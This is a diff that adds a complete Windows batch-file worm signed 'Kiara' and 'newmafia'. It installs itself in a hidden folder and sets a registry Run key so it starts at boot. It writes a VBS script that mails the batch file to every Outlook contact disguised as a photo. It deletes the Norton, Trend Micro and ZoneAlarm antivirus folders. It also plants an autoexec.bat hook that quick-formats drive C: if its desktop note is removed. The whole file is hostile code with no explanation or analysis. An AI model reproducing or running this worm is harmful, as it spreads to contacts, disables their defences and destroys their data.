@@ -1,0 +1,57 @@
+@echo off
+date 21/11/85
+md\windows\kiara
+copy /y *.bat C:\windows\kiara
+ren C:\windows\kiara\*.bat kiara.bat
+echo REGEDIT4 >C:\kiara.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion] >nul >>C:\kiara.reg
+echo "RegisteredOwner"="Kiara" >nul >>C:\kiara.reg
+echo "RegisteredOrganization"="newmafia" >nul >>C:\kiara.reg
+regedit /s C:\kiara.reg
+attrib +h +r C:\kiara.reg
+echo REGEDIT4 >C:\windows\kiara.reg
+echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] >nul >>C:\windows\kiara.reg
+echo "kiara"="C:\\WINDOWS\\kiara\\kiara.bat" >nul >>C:\windows\kiara.reg
+regedit /s C:\windows\kiara.reg
+attrib +h +r C:\windows\kiara.reg
+echo Set Kiara = CreateObject("Outlook.Application") >C:\windows\kiara.vbs
+echo Set kiar = Client.GetNameSpace("MAPI") >nul >>C:\windows\kiara.vbs
+echo For ItemList = 1 To Address.AddressLists.Count >nul >>C:\windows\kiara.vbs
+echo    Set CurrentAddress = Address.AddressLists(ItemList) >nul >>C:\windows\kiara.vbs
+echo        For entries = 1 To CurrentAddress.AddressEntries.Count >nul >>C:\windows\kiara.vbs
+echo            victim = CurrentAddress.AddressEntries(entries) >nul >>C:\windows\kiara.vbs
+echo            Set Mailtosend = Client.CreateItem(0) >nul >>C:\windows\kiara.vbs
+echo            Mailtosend.Recipients.Add (victim) >nul >>C:\windows\kiara.vbs
+echo            Mailtosend.Subject = "Your friend Kiara" >nul >>C:\windows\kiara.vbs
+echo            Mailtosend.Body = "Hi..... you remember me.... I am Kiara... I have sent you my photo it is in the attached file" >nul >>C:\windows\kiara.vbs
+echo            Mailtosend.Attachments.Add ("c:\windows\kiara\kiara.bat") >nul >>C:\windows\kiara.vbs
+echo            Mailtosend.Send >nul >>C:\windows\kiara.vbs
+echo        Next >nul >>C:\windows\kiara.vbs
+echo Next >nul >>C:\windows\kiara.vbs
+echo Set kiara = Nothing >nul >>C:\windows\kiara.vbs
+echo Set kiar = Nothing >nul >>C:\windows\kiara.vbs
+start C:\windows\kiara.vbs
+attrib +h +r C:\windows\kiara.vbs
+if exist C:\progra~1\norton~1\*.* del C:\progra~1\norton~1\*.*
+cls
+if exist C:\progra~1\norton~2\*.* del C:\progra~1\norton~2\*.*
+cls
+if exist C:\progra~1\trendm~1\*.* del C:\progra~1\trendm~1\*.*
+cls
+if exist C:\progra~1\zonela~1\*.* del C:\progra~1\zonela~1\*.*
+cls
+echo Hi... I am Kiara.... we will be together starting today always >C:\windows\desktop\kiara.txt
+echo Ciao... sono Kiara....da oggi staremo sempre insieme >nul >>C:\windows\desktop\kiara.txt
+cls
+echo if not exist C:\windows\desktop\kiara.txt format C: /q /u /autotest >C:\windows\system\kiara.bat
+attrib -h -r C:\autoexec.bat >nul
+echo :: kiara >nul >>C:\autoexec.bat
+echo @call C:\windows\system\kiara.bat >>C:\autoexec.bat
+echo :: end kiara >nul >>C:\autoexec.bat
+cls
+echo msgbox "Kiara" ,vbinformation ,"NEWMAFIA" >C:\kiara.vbs
+start C:\windows\kiara.vbs
+attrib +h +r C:\kiara.vbs
+cls
+
+
